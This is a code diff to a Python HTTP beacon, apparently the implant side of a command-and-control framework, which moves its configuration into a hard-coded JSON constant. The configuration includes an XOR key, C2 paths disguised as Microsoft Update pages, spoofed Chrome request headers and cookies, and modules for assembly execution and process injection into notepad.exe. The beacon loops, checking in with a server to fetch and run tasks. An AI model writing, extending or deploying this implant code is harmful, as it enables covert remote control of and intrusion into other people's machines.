@@ -11,6 +11,74 @@ urllib3.disable_warnings()
 
 from Beacon import Beacon
 
+CONFIG_JSON = r"""
+{
+    "DomainName": "",
+    "ExposedIp": "",
+    "xorKey": "dfsdgferhzdzxczevre5595485sdg",
+    "ListenerHttpConfig": {
+        "uri": [
+            "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
+            "/MicrosoftUpdate/ShellEx/KB242742/admin.aspx",
+            "/MicrosoftUpdate/ShellEx/KB242742/download.aspx"
+        ],
+        "client": {
+            "headers": {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+                "Connection": "Keep-Alive",
+                "Content-Type": "text/plain;charset=UTF-8",
+                "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+                "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ==",
+                "Keep-Alive": "timeout=5, max=1000",
+                "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1",
+                "Accept": "*/*",
+                "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
+                "Sec-Ch-Ua-Platform": "Windows"
+            }
+        }
+    },
+    "ListenerHttpsConfig": {
+        "uri": [
+            "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
+            "/MicrosoftUpdate/ShellEx/KB242742/upload.aspx",
+            "/MicrosoftUpdate/ShellEx/KB242742/config.aspx"
+        ],
+        "client": {
+            "headers": {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+                "Connection": "Keep-Alive",
+                "Content-Type": "text/plain;charset=UTF-8",
+                "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+                "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ==",
+                "Keep-Alive": "timeout=5, max=1000",
+                "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1",
+                "Accept": "*/*",
+                "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
+                "Sec-Ch-Ua-Platform": "Windows"
+            }
+        }
+    },
+    "ModulesConfig": {
+        "assemblyExec": {
+            "process": "notepad.exe",
+            "test": "test"
+        },
+        "inject": {
+            "process": "notepad.exe",
+            "test": "test"
+        },
+        "toto": {
+            "process": "test",
+            "test": "test"
+        }
+    }
+}
+"""
+
+def load_config_from_const():
+    """Parse the JSON string constant and return it as a Python dict."""
+    return json.loads(CONFIG_JSON)
+
 
 DEFAULT_HTTP_SCHEME = "http"
 DEFAULT_HTTPS_SCHEME = "https"
@@ -28,7 +96,7 @@ CONFIG_KEY_HEADERS = "headers"
 
 class BeaconHttp(Beacon):
 
-    def __init__(self, url, port, isHttps, config_path=None):
+    def __init__(self, url, port, isHttps):
         super().__init__()
         self.url = str(url)
         self.port = str(port)
@@ -37,13 +105,7 @@ class BeaconHttp(Beacon):
         self._headers = {}
         self._uris = []
 
-        if config_path is None:
-            config_path = Path(__file__).with_name("BeaconConfig.json")
-        else:
-            config_path = Path(config_path)
-
-        self._load_config(config_path)
-
+        self._load_config()
 
     def checkIn(self):
         payload = self.serialize_task_results()
@@ -81,12 +143,8 @@ class BeaconHttp(Beacon):
         self.cmdToTasks(body)
 
 
-    def _load_config(self, config_path: Path) -> None:
-        try:
-            config_text = config_path.read_text(encoding="utf-8")
-            config_data = json.loads(config_text)
-        except Exception:
-            config_data = {}
+    def _load_config(self) -> None:
+        config_data = load_config_from_const()
 
         xor_key = config_data.get(CONFIG_KEY_XOR, "")
         self.set_xor_key(xor_key)
@@ -128,9 +186,8 @@ def main() -> int:
     url = sys.argv[1]
     port = sys.argv[2]
     isHttps = sys.argv[3]
-    config_path = sys.argv[4] if len(sys.argv) > 4 else None
 
-    beaconHttp = BeaconHttp(url, port, isHttps, config_path)
+    beaconHttp = BeaconHttp(url, port, isHttps)
     
     while 1:
         beaconHttp.checkIn()
